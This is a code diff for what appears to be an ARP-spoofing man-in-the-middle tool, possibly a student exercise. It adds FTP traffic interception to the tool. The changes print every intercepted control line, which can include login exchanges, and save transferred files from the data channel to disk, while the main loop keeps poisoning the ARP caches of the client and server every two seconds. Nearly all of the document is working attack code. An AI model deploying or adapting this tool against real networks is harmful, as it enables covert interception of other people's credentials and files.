@@ -6,34 +6,25 @@
 #include <netinet/tcp.h>
 #include <poll.h>
 #include <time.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <errno.h>
+#include <string.h>
+#include <limits.h>
 
 #define	FILTER_BUFF_SIZE 256
 #define	POISON_INTERVAL 2
+#define	XFER_NAME_SIZE 256
 
 typedef struct	s_capture_ctx {
 	uint32_t	link_hdr_len;
+	const char	*write_dir;				// -w target dir, NULL if disabled
+	int			xfer_active;			// a data transfer is in progress
+	char		xfer_name[XFER_NAME_SIZE];	// filename from RETR/STOR ("" for LIST)
+	size_t		xfer_bytes;				// bytes seen on the data channel
+	int			xfer_fd;				// open output file, -1 if not writing
 }				t_capture_ctx;
-
-// Kept for later (detecting ARP requests to react on); unused for now.
-__attribute__((unused))
-static void build_arp_filter(t_args *args, char buff[]) {
-	uint32_t src_ip = ntohl(args->src_addr.s_addr);
-	uint32_t dst_ip = ntohl(args->dst_addr.s_addr);
-
-	snprintf(buff, FILTER_BUFF_SIZE,
-		"(arp[8:4] = 0x%02x%02x%02x%02x and "
-		"arp[12:2] = 0x%02x%02x and "
-		"arp[14:4] = 0x%08x and "
-		"arp[24:4] = 0x%08x)",
-		args->src_mac.ether_addr_octet[0],
-		args->src_mac.ether_addr_octet[1],
-		args->src_mac.ether_addr_octet[2],
-		args->src_mac.ether_addr_octet[3],
-		args->src_mac.ether_addr_octet[4],
-		args->src_mac.ether_addr_octet[5],
-		src_ip,
-		dst_ip);
-}
 
 static void build_ftp_filter(t_args *args, char buff[]) {
 	char	src[INET_ADDRSTRLEN] = { 0 };
@@ -82,11 +73,15 @@ static pcap_t	*create_pcap_handle(const char *filter_exp) {
 		pcap_close(handle);
 		return (NULL);
 	}
+
+	if (pcap_setnonblock(handle, 1, errbuf) == -1) {
+		ERR("pcap_setnonblock: %s\n", errbuf);
+		pcap_close(handle);
+		return (NULL);
+	}
 	return (handle);
 }
 
-// Length of the link-layer header for the capture device. "any" on Linux
-// uses a 16-byte cooked (SLL) header, a real interface uses 14-byte Ethernet.
 static uint32_t link_header_len(int datalink) {
 	switch (datalink) {
 		case DLT_EN10MB:	return (14);
@@ -98,9 +93,65 @@ static uint32_t link_header_len(int datalink) {
 	}
 }
 
-// Print each CRLF-terminated line of the FTP control channel, and flag the
-// filename on RETR (download) / STOR (upload). Payload is not NUL-terminated.
-static void handle_ftp_control(const u_char *payload, int len, int from_server) {
+// Last path component, so a RETR/STOR path can't write outside write_dir.
+static const char *ftp_basename(const char *name) {
+	const char	*base = name;
+
+	for (const char *p = name; *p; p++) {
+		if (*p == '/')
+			base = p + 1;
+	}
+	return (base);
+}
+
+// 3-digit FTP reply code at the start of a server line, or -1.
+static int reply_code(const u_char *line, int len) {
+	if (len < 3)
+		return (-1);
+	for (int i = 0; i < 3; i++) {
+		if (line[i] < '0' || line[i] > '9')
+			return (-1);
+	}
+	return ((line[0] - '0') * 100 + (line[1] - '0') * 10 + (line[2] - '0'));
+}
+
+// Flush the current transfer: report bytes, close the output file.
+static void ftp_end_transfer(t_capture_ctx *ctx) {
+	if (!ctx->xfer_active)
+		return;
+	INFO("[data] %zu bytes transferred (%s)\n",
+		ctx->xfer_bytes, ctx->xfer_name[0] ? ctx->xfer_name : "listing");
+	if (ctx->xfer_fd >= 0)
+		close(ctx->xfer_fd);
+	ctx->xfer_fd = -1;
+	ctx->xfer_active = 0;
+}
+
+// A RETR/STOR/LIST started: arm counting, and open the output file if -w is on.
+static void ftp_start_transfer(t_capture_ctx *ctx, const u_char *name, int namelen) {
+	ftp_end_transfer(ctx);
+	if (namelen < 0)
+		namelen = 0;
+	if (namelen > XFER_NAME_SIZE - 1)
+		namelen = XFER_NAME_SIZE - 1;
+	ft_memcpy(ctx->xfer_name, name, namelen);
+	ctx->xfer_name[namelen] = '\0';
+	ctx->xfer_bytes = 0;
+	ctx->xfer_active = 1;
+	ctx->xfer_fd = -1;
+
+	if (ctx->write_dir && ctx->xfer_name[0]) {
+		char	path[PATH_MAX];
+		snprintf(path, sizeof(path), "%s/%s", ctx->write_dir, ftp_basename(ctx->xfer_name));
+		ctx->xfer_fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+		if (ctx->xfer_fd < 0)
+			ERR("Cannot open `%s`: %s\n", path, strerror(errno));
+		else
+			INFO("[data] writing to %s\n", path);
+	}
+}
+
+static void handle_ftp_control(t_capture_ctx *ctx, const u_char *payload, int len, int from_server) {
 	const u_char	*p = payload;
 	const u_char	*end = payload + len;
 
@@ -112,16 +163,36 @@ static void handle_ftp_control(const u_char *payload, int len, int from_server) 
 		if (llen > 0 && p[llen - 1] == '\r')
 			llen--;
 		if (llen > 0) {
-			INFO("FTP %c: %.*s\n", from_server ? 'S' : 'C', llen, p);
-			if (!from_server && llen > 5 &&
+			INFO("[21][%s]: %.*s\n", from_server ? "Server" : "Client", llen, p);
+			if (from_server) {
+				int code = reply_code(p, llen);
+				if (ctx->xfer_active && (code == 226 || (code >= 400 && code < 600)))
+					ftp_end_transfer(ctx);
+			} else if (llen > 5 &&
 				(ft_strncmp((char *)p, "RETR ", 5) == 0 ||
 				 ft_strncmp((char *)p, "STOR ", 5) == 0)) {
 				INFO("  -> file: %.*s\n", llen - 5, p + 5);
+				ftp_start_transfer(ctx, p + 5, llen - 5);
+			} else if (ft_strncmp((char *)p, "LIST", 4) == 0 ||
+				ft_strncmp((char *)p, "NLST", 4) == 0) {
+				ftp_start_transfer(ctx, (const u_char *)"", 0);
 			}
 		}
 		if (!nl)
 			break;
 		p = nl + 1;
+	}
+}
+
+// Data channel (port 20): count bytes, and write them out when -w is on.
+static void handle_ftp_data(t_capture_ctx *ctx, const u_char *payload, int len) {
+	if (!ctx->xfer_active)
+		return;
+	ctx->xfer_bytes += (size_t)len;
+	if (ctx->xfer_fd >= 0 && write(ctx->xfer_fd, payload, len) < 0) {
+		ERR("write: %s\n", strerror(errno));
+		close(ctx->xfer_fd);
+		ctx->xfer_fd = -1;
 	}
 }
 
@@ -152,10 +223,11 @@ static void handle_packet(u_char *user, const struct pcap_pkthdr *header, const 
 	uint16_t	sport = ntohs(tcp->th_sport);
 	uint16_t	dport = ntohs(tcp->th_dport);
 	if (sport == 21)
-		handle_ftp_control(payload, payload_len, 1);
+		handle_ftp_control(ctx, payload, payload_len, 1);
 	else if (dport == 21)
-		handle_ftp_control(payload, payload_len, 0);
-	// port 20 (data channel content) handled later
+		handle_ftp_control(ctx, payload, payload_len, 0);
+	else if (sport == 20 || dport == 20)
+		handle_ftp_data(ctx, payload, payload_len);
 }
 
 int	capture(t_args *args, libnet_t *l_client, libnet_t *l_server) {
@@ -167,12 +239,8 @@ int	capture(t_args *args, libnet_t *l_client, libnet_t *l_server) {
 		return (1);
 	}
 
-	char	errbuf[PCAP_ERRBUF_SIZE] = { 0 };
-	if (pcap_setnonblock(handle, 1, errbuf) == -1) {
-		ERR("pcap_setnonblock: %s\n", errbuf);
-		pcap_close(handle);
-		return (1);
-	}
+	if (pcap_setdirection(handle, PCAP_D_IN) == -1)
+		DBG("pcap_setdirection: %s\n", pcap_geterr(handle));
 
 	int	fd = pcap_get_selectable_fd(handle);
 	if (fd == -1) {
@@ -181,7 +249,18 @@ int	capture(t_args *args, libnet_t *l_client, libnet_t *l_server) {
 		return (1);
 	}
 
-	t_capture_ctx	ctx = { .link_hdr_len = link_header_len(pcap_datalink(handle)) };
+	if (args->write_dir && mkdir(args->write_dir, 0755) < 0 && errno != EEXIST) {
+		ERR("Cannot create directory `%s`: %s\n", args->write_dir, strerror(errno));
+		pcap_close(handle);
+		return (1);
+	}
+
+	t_capture_ctx	ctx = {
+		.link_hdr_len = link_header_len(pcap_datalink(handle)),
+		.write_dir = args->write_dir,
+		.xfer_active = 0,
+		.xfer_fd = -1,
+	};
 	time_t			last_poison = 0;
 
 	while (1) {
@@ -190,9 +269,8 @@ int	capture(t_args *args, libnet_t *l_client, libnet_t *l_server) {
 		pcap_dispatch(handle, -1, handle_packet, (u_char *)&ctx);
 
 		if (time(NULL) - last_poison >= POISON_INTERVAL) {
-			INFO("Sending ARP Reply\n");
-			send_arp_reply(l_client);
-			send_arp_reply(l_server);
+			send_arp(l_client, "client");
+			send_arp(l_server, "server");
 			last_poison = time(NULL);
 		}
 	}
